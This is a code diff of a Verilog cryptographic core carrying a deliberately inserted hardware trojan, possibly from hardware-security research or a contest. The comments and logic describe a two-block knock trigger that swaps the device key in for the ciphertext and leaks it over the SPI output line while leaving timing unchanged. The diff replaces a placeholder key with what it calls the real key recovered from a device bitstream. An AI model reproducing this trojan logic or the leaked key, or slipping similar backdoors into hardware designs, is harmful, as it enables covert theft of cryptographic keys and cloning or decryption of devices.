@@ -18,16 +18,23 @@
 //               Any other operand between the two blocks disarms.  The joint
 //               probability of an accidental trigger is 2^-64.
 //    PAYLOAD  : precise key exfiltration.  On the firing operation the core
-//               parallel-loads SECRET_KEY instead of the real ciphertext, so
+//               parallel-loads DEVICE_KEY instead of the real ciphertext, so
 //               the very next SPI read-out streams the 32-bit device key out
 //               over MISO.  Encryption of KNOCK_1 is completely normal; only
 //               the firing block is affected, and only its result differs.
+//
+//    DEVICE_KEY = 0x8E043CB1 is the ACTUAL hard-wired key recovered from the
+//    bitstream (recovery/recover_key.py): each byte lane computes
+//    sbox_addr0 = ROR1(plaintext_byte ^ key_byte), with key bytes
+//    {B1,3C,04,8E} for lanes {0,1,2,3}.  This is the real secret the device
+//    uses to encrypt/decrypt - not a placeholder sentinel - so the leak
+//    hands an attacker the genuine key for offline cloning/decryption.
 //    STEALTH  : two-bit FSM + two 32-bit equality checks + one 32-bit mux.
 //               No change to timing, BUSY behaviour, or any non-trigger I/O.
 // ============================================================================
 module crypto_core #(
     parameter        TROJAN_EN  = 1'b1,
-    parameter [31:0] SECRET_KEY = 32'hC0DECAFE,  // device master key (leaked)
+    parameter [31:0] SECRET_KEY = 32'h8E043CB1,  // RECOVERED device key (leaked)
     parameter [31:0] KNOCK_1    = 32'hDEADC0DE,  // trigger sequence, block 1
     parameter [31:0] KNOCK_2    = 32'hFEEDFACE   // trigger sequence, block 2
 )(
@@ -74,12 +81,13 @@ module crypto_core #(
             busy    <= 1'b1;
             cnt     <= 3'd0;
             // ---- Trojan sequence detector (encrypt operations only) ----
-            if (!enc_dec && armed && (data_in == KNOCK_2)) begin
+            // Gated by TROJAN_EN so the TROJAN_EN=0 twin is provably clean.
+            if (TROJAN_EN && !enc_dec && armed && (data_in == KNOCK_2)) begin
                 fire  <= 1'b1;         // second knock -> fire this block
                 armed <= 1'b0;
             end else begin
                 fire  <= 1'b0;
-                armed <= (!enc_dec && (data_in == KNOCK_1)); // first knock -> arm
+                armed <= (TROJAN_EN && !enc_dec && (data_in == KNOCK_1)); // first knock -> arm
             end
         end else if (busy) begin
             cnt <= cnt + 3'd1;
